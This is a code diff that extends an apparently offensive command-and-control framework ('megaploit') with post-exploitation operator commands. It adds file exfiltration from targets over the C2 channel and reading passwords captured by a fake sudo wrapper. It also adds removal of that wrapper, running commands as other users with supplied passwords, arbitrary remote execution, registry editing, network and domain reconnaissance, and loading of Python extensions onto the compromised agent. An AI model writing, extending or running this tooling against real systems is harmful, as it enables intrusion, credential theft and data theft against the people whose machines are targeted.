@@ -109,6 +109,27 @@ def _recv_file_or_err(conn, local: str, timeout: float | None = None) -> "Comman
 # Core
 # ---------------------------------------------------------------------------
 
+@_cmd("note", usage="note <text>",
+      help_text="Append a note to this session (saved with the session, included in reports)")
+def cmd_note(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: note <text>")
+    text = " ".join(args)
+    if session.notes:
+        session.notes = session.notes + "\n" + text
+    else:
+        session.notes = text
+    return _ok(f"[+] Note saved: {text[:80]}")
+
+
+@_cmd("notes", usage="notes",
+      help_text="Show all notes recorded for this session")
+def cmd_notes(session: Session, args: list[str]) -> CommandResult:
+    if not session.notes:
+        return _ok("(no notes)")
+    return _ok(session.notes)
+
+
 @_cmd("help", usage="help", help_text="Show this help message")
 def cmd_help(session: Session, args: list[str]) -> CommandResult:
     lines = ["", f"  {'COMMAND':<36}  DESCRIPTION"]
@@ -171,35 +192,96 @@ def cmd_sandbox_check(session: Session, args: list[str]) -> CommandResult:
 # File transfer — uses the binary length-prefix protocol, not shell
 # ---------------------------------------------------------------------------
 
+# ---------------------------------------------------------------------------
+# Progress helper (Gap 5)
+# ---------------------------------------------------------------------------
+
+def _progress_bar(current: int, total: int, width: int = 40) -> str:
+    """Build a simple ASCII progress bar string."""
+    if total <= 0:
+        return f"[{'?' * width}]  ?"
+    pct   = current / total
+    filled = int(pct * width)
+    bar   = "█" * filled + "░" * (width - filled)
+    human_done  = _human_size_proto(current)
+    human_total = _human_size_proto(total)
+    return f"[{bar}] {pct * 100:5.1f}%  {human_done} / {human_total}"
+
+
+def _human_size_proto(n: int) -> str:
+    for unit in ("B", "KB", "MB", "GB"):
+        if n < 1024:
+            return f"{n:.0f} {unit}"
+        n //= 1024
+    return f"{n} TB"
+
+
 @_cmd("upload", usage="upload <local_file>",
-      help_text="Push a local file to the target over the C2 channel")
+      help_text="Push a local file to the target over the C2 channel (with transfer progress)")
 def cmd_upload(session: Session, args: list[str]) -> CommandResult:
     if len(args) != 1:
         return _err("Usage: upload <local_file>")
     path = args[0]
     if not os.path.isfile(path):
         return _err(f"File not found: {path}")
+
+    file_size = os.path.getsize(path)
+    print(f"\r  Uploading  {os.path.basename(path)}  ({_human_size_proto(file_size)})…", end="", flush=True)
+    import time as _time
+    t0 = _time.monotonic()
+
     send_msg(session.conn, f"upload {os.path.basename(path)}")
-    send_file(session.conn, path)
+    try:
+        send_file(session.conn, path)
+    except ConnectionError as e:
+        print()
+        return _err(f"[-] Send failed: {e}")
+
+    elapsed = _time.monotonic() - t0
+    speed   = file_size / max(elapsed, 0.001)
+    print(f"\r  {_progress_bar(file_size, file_size)}  {_human_size_proto(int(speed))}/s    ")
+
+    # BUG (was): bare except swallowed recv_msg errors silently, making the
+    # operator think the upload succeeded even when the agent never confirmed.
+    # Now surfaces the ACK (or a clear error) so the operator knows the
+    # true outcome.
     try:
         ack = recv_msg(session.conn)
-    except Exception:
-        ack = ""
-    return _ok(f"[+] Uploaded '{path}'" + (f"\n    Agent: {ack}" if ack else ""))
+    except (ConnectionError, OSError, ValueError) as e:
+        return _err(f"[-] Upload sent but no ACK received: {e}")
+    return _ok(
+        f"[+] Uploaded '{path}'  ({_human_size_proto(file_size)}  in {elapsed:.1f}s  "
+        f"@ {_human_size_proto(int(speed))}/s)"
+        + (f"\n    Agent: {ack}" if ack else "")
+    )
 
 
 @_cmd("download", usage="download <remote_file>",
-      help_text="Pull a file from the target over the C2 channel")
+      help_text="Pull a file from the target over the C2 channel (with transfer progress)")
 def cmd_download(session: Session, args: list[str]) -> CommandResult:
     if len(args) != 1:
         return _err("Usage: download <remote_file>")
     remote = args[0]
     local  = session.download_path(remote)
+
+    print(f"\r  Downloading  {remote}…", end="", flush=True)
+    import time as _time
+    t0 = _time.monotonic()
+
     send_msg(session.conn, f"download {remote}")
     err = _recv_file_or_err(session.conn, local, timeout=60)
     if err:
+        print()
         return err
-    return _ok(f"[+] Saved to: {local}")
+
+    elapsed   = _time.monotonic() - t0
+    file_size = os.path.getsize(local) if os.path.isfile(local) else 0
+    speed     = file_size / max(elapsed, 0.001)
+    print(f"\r  {_progress_bar(file_size, file_size)}  {_human_size_proto(int(speed))}/s    ")
+    return _ok(
+        f"[+] Saved to: {local}  ({_human_size_proto(file_size)}  in {elapsed:.1f}s  "
+        f"@ {_human_size_proto(int(speed))}/s)"
+    )
 
 
 @_cmd("zip_download", usage="zip_download <remote_path>",
@@ -525,6 +607,20 @@ def cmd_ssh_harvest(session: Session, args: list[str]) -> CommandResult:
       help_text="Plant a fake sudo wrapper that captures the next password typed (Unix)")
 def cmd_sudo_sniff(session: Session, args: list[str]) -> CommandResult:
     send_msg(session.conn, ("sudo_sniff " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("sudo_sniff_read", usage="sudo_sniff_read [log_path]",
+      help_text="Read passwords captured by sudo_sniff (default log: /tmp/.ssniff)")
+def cmd_sudo_sniff_read(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("sudo_sniff_read " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("sudo_sniff_clean", usage="sudo_sniff_clean [log_path]",
+      help_text="Remove fake sudo wrapper and captured log from target (Unix)")
+def cmd_sudo_sniff_clean(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("sudo_sniff_clean " + " ".join(args)).strip())
     return _ok(recv_msg(session.conn))
 
 
@@ -1650,3 +1746,245 @@ def all_commands() -> dict[str, _CommandDef]:
     return dict(_registry)
 
 
+
+
+# ===========================================================================
+# Gaps vs Metasploit — new server commands
+# ===========================================================================
+
+# ---------------------------------------------------------------------------
+# Gap 1 — run_as / execute_process
+# ---------------------------------------------------------------------------
+
+@_cmd("run_as", usage="run_as <user> <password> <command>",
+      help_text="Run a command as a different user (Windows: CreateProcessWithLogonW; Unix: sudo/su)",
+      dangerous=True)
+def cmd_run_as(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 3:
+        return _err("Usage: run_as <user> <password> <command>")
+    send_msg(session.conn, "run_as " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("execute", usage="execute <exe> [args...]",
+      help_text="Execute an arbitrary binary on the target and return output (explicit argv, no shell)")
+def cmd_execute(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: execute <exe> [args...]")
+    send_msg(session.conn, "execute " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Gap 2 — reg command (Windows registry CRUD)
+# ---------------------------------------------------------------------------
+
+@_cmd("reg", usage="reg <query|get|set|delete> <HIVE\\\\key> [args...]",
+      help_text="Windows registry CRUD: query / get / set / delete keys and values")
+def cmd_reg(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err(
+            "Usage:\n"
+            "  reg query  HKLM\\\\Software\\\\Microsoft\n"
+            "  reg get    HKCU\\\\<key> <value_name>\n"
+            "  reg set    HKCU\\\\<key> <value_name> REG_SZ <data>\n"
+            "  reg delete HKCU\\\\<key> [value_name]"
+        )
+    send_msg(session.conn, "reg " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Gap 3 — getdesktop / enumdesktops
+# ---------------------------------------------------------------------------
+
+@_cmd("getdesktop", usage="getdesktop",
+      help_text="Return the name of the current interactive desktop (Windows) or DISPLAY info (Unix)")
+def cmd_getdesktop(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "getdesktop")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("enumdesktops", usage="enumdesktops",
+      help_text="Enumerate all desktops in the current Windows window station")
+def cmd_enumdesktops(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "enumdesktops")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Gap 6 — verify: server-side SHA-256 verification after file transfer
+# ---------------------------------------------------------------------------
+
+@_cmd("verify", usage="verify <local_file> <remote_file>",
+      help_text="Verify a transferred file: compare local SHA-256 with the agent's hash")
+def cmd_verify(session: Session, args: list[str]) -> CommandResult:
+    if len(args) != 2:
+        return _err("Usage: verify <local_file> <remote_file>")
+    local_path, remote_path = args[0], args[1]
+
+    if not os.path.isfile(local_path):
+        return _err(f"Local file not found: {local_path}")
+
+    # Compute local hash
+    import hashlib
+    h = hashlib.sha256()
+    try:
+        with open(local_path, "rb") as fh:
+            for chunk in iter(lambda: fh.read(65536), b""):
+                h.update(chunk)
+    except OSError as e:
+        return _err(f"Cannot read local file: {e}")
+    local_hash = h.hexdigest()
+
+    # Ask agent for remote hash
+    send_msg(session.conn, f"file_hash {remote_path}")
+    remote_response = recv_msg(session.conn)
+    # Handler returns:  "[+] SHA-256  <path>\n    <hex>"
+    remote_hash = ""
+    for line in remote_response.splitlines():
+        stripped = line.strip()
+        if len(stripped) == 64 and all(c in "0123456789abcdef" for c in stripped):
+            remote_hash = stripped
+            break
+
+    if not remote_hash:
+        return _err(f"Could not parse remote hash from: {remote_response}")
+
+    if local_hash == remote_hash:
+        return _ok(
+            f"[+] Integrity VERIFIED — hashes match\n"
+            f"    SHA-256: {local_hash}\n"
+            f"    Local:   {local_path}\n"
+            f"    Remote:  {remote_path}"
+        )
+    return _err(
+        f"[-] MISMATCH — file corrupted in transit!\n"
+        f"    Local  SHA-256: {local_hash}\n"
+        f"    Remote SHA-256: {remote_hash}"
+    )
+
+
+# ---------------------------------------------------------------------------
+# Gap 7 — run_bg / background execution via jobs engine
+# ---------------------------------------------------------------------------
+
+@_cmd("run_bg", usage="run_bg <command>",
+      help_text="Run a shell command on the target as a background job; poll with 'job_result <id>'")
+def cmd_run_bg(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: run_bg <command>")
+
+    from megaploit.core.jobs import job_manager
+    from megaploit.core.protocol import send_msg as _sm, recv_msg as _rm
+
+    cmd_str = " ".join(args)
+    conn    = session.conn
+
+    def _bg_runner():
+        _sm(conn, cmd_str)
+        return _rm(conn)
+
+    jid = job_manager.submit(f"run_bg:session#{session.id}:{cmd_str[:40]}", _bg_runner)
+    return _ok(
+        f"[+] Background job started — ID: {jid}\n"
+        f"    Command: {cmd_str}\n"
+        f"    Poll with:  job_result {jid}\n"
+        f"    Kill with:  jobs kill {jid}"
+    )
+
+
+@_cmd("job_result", usage="job_result <job_id>",
+      help_text="Retrieve the output of a completed background job")
+def cmd_job_result(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: job_result <job_id>")
+    from megaploit.core.jobs import job_manager, JobStatus
+    jid = args[0]
+    job = job_manager.get(jid)
+    if job is None:
+        return _err(f"No job with ID {jid}")
+    if job.status in (JobStatus.PENDING, JobStatus.RUNNING):
+        return _ok(f"[*] Job {jid} is still {job.status.value}…")
+    if job.status == JobStatus.FAILED:
+        return _err(f"Job {jid} FAILED:\n{job.error}")
+    if job.status == JobStatus.KILLED:
+        return _ok(f"[!] Job {jid} was killed.")
+    result = job.result
+    return _ok(f"[+] Job {jid} completed:\n{result}")
+
+
+# ---------------------------------------------------------------------------
+# Gap 10 — net_view / Windows domain enumeration from agent
+# ---------------------------------------------------------------------------
+
+@_cmd("net_view", usage="net_view [domain]",
+      help_text="List domain computers, shares, and DCs visible from the target")
+def cmd_net_view(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("net_view " + " ".join(args)).strip())
+    old = session.conn.gettimeout()
+    session.conn.settimeout(30)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"net_view error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+# ---------------------------------------------------------------------------
+# Gap 11 — arp_scan active ARP scan from agent
+# ---------------------------------------------------------------------------
+
+@_cmd("arp_scan", usage="arp_scan <cidr>",
+      help_text="Active ARP scan of a subnet from the target — discovers hosts even when ICMP is filtered")
+def cmd_arp_scan(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: arp_scan <cidr>  e.g.  arp_scan 192.168.1.0/24")
+    send_msg(session.conn, f"arp_scan {args[0]}")
+    old = session.conn.gettimeout()
+    session.conn.settimeout(60)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"arp_scan error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+# ---------------------------------------------------------------------------
+# Gap 13 — load_ext: upload a Python extension file + register its verbs
+# ---------------------------------------------------------------------------
+
+@_cmd("load_ext", usage="load_ext <local_py_file>",
+      help_text=(
+          "Upload a local Python extension to the agent and register its exported "
+          "verbs. The file must define a HANDLERS dict mapping verb → callable(conn, args)."
+      ))
+def cmd_load_ext(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: load_ext <local_py_file>")
+    local_path = args[0]
+    if not os.path.isfile(local_path):
+        return _err(f"File not found: {local_path}")
+
+    remote_name = os.path.basename(local_path)
+
+    # Upload the file
+    send_msg(session.conn, f"upload {remote_name}")
+    try:
+        send_file(session.conn, local_path)
+    except ConnectionError as e:
+        return _err(f"Upload failed: {e}")
+    try:
+        ack = recv_msg(session.conn)
+    except Exception as e:
+        return _err(f"Upload ACK error: {e}")
+
+    # Now ask the agent to load it as an extension
+    send_msg(session.conn, f"load_extension {remote_name}")
+    try:
+        resp = recv_msg(session.conn)
+    except Exception as e:
+        return _err(f"load_extension error: {e}")
+    return _ok(f"[+] Extension uploaded and loaded: {remote_name}\n    Agent: {resp}")
